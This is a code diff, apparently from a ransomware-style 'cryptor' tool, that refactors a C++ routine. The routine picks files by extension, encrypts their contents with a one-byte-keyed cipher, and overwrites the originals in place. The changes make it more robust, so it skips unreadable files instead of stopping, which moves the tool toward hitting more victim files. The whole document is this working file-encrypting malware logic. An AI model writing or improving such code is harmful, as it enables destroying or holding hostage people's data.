@@ -22,83 +22,48 @@ namespace cryptor {
 namespace fs = std::filesystem;
 
 // Function to identify certain file extensions
-bool isExtensionValid(std::vector<std::string> extensions, std::string directory) {
-    /* Check to see if the directory we are trying to enter exists */
-    if (fs::exists(directory) && fs::is_directory(directory)) {
-        try {
-            /* If so, iterate through each entry in the provided directory */
-            for (const auto& entry : fs::directory_iterator(directory)) {
-                
-                /* Check to see if the current entry is a regular file and not some directory or a link */
-                if (entry.is_regular_file()) {
-                    /* Get these file extensions as a string */
-                    std::string _ext = entry.path().extension().string();
-                    
-                    /*
-                     * Apply a filter to filter through
-                     * these found entries and match them
-                     * to the entry extension string
-                     */
-                    for (const auto& extFilter : extensions) {
-                        /*
-                         * If the file entry matches the supplied extensions
-                         * vector, then, we have our target file, encrypt it
-                         */
-                        if (_ext == extFilter) {
-                            return true;
-                        }
-                    }
-                }
-            }
-        } catch (fs::filesystem_error& err) {
-            banners::print_error({err.what()});
-            exit(1);
+bool isExtensionValid(const std::vector<std::string>& extensions, const std::string& file_path) {
+    std::string ext = fs::path(file_path).extension().string();
+
+    for (const auto& valid_ext : extensions) {
+        if (ext == valid_ext) {
+            return true;
         }
-        
-    } else {
-        banners::print_error({"Directory does not exist", directory});
-        return false;
     }
-    
     return false;
 }
 
 // Function to encrypt a singular file
 void encrypt_file(const fs::path& file_path, char key) {
+    // Check if the file extension is valid
+    if (!isExtensionValid(validExtensions, file_path.string())) {
+        // Skip files with invalid extensions
+        return;
+    }
+
     /* Open the current target file in binary mode */
     std::ifstream input_file(file_path, std::ios::binary);
-    
-    /* Throw an error if the current input file cannot be opened */
     if (!input_file) {
-        banners::print_error({"Failed to open file/file path for reading", file_path});
-        exit(1);
+        banners::print_error({"Failed to open file for reading", file_path});
+        return; // Don't exit; just skip
     }
-    
+
     /* Read all of the file into a string */
     std::string buff((std::istreambuf_iterator<char>(input_file)),
-                              std::istreambuf_iterator<char>());
-
+                      std::istreambuf_iterator<char>());
     input_file.close();
-    
-    /* Encrypt the file using MSH cipher if the valid extensions are found */
-    
-    if (isExtensionValid(validExtensions, fs::current_path())) {
-        cipher::msh_cipher(buff, 0xA9);
+
+    /* Encrypt the file data directly */
+    cipher::msh_cipher(buff, key);
+
+    /* Write back the encrypted data into the same file */
+    std::ofstream output_file(file_path, std::ios::binary);
+    if (!output_file) {
+        banners::print_error({"Failed to open file for writing", file_path});
+        return;
     }
-    
-    /* Open the same file for writing */
-    std::ofstream ot_file(file_path, std::ios::binary);
-
-    if (!ot_file) {
-        banners::print_error({"Could not open file for writing...", file_path});
-        exit(1);
-    }
-    
-    /* Write the encrypted data back into the file */
-    ot_file.write(buff.c_str(), buff.size());
-    ot_file.close();
-
-
+    output_file.write(buff.c_str(), buff.size());
+    output_file.close();
 }
 
 // Function to recursively recurse through the defined directory
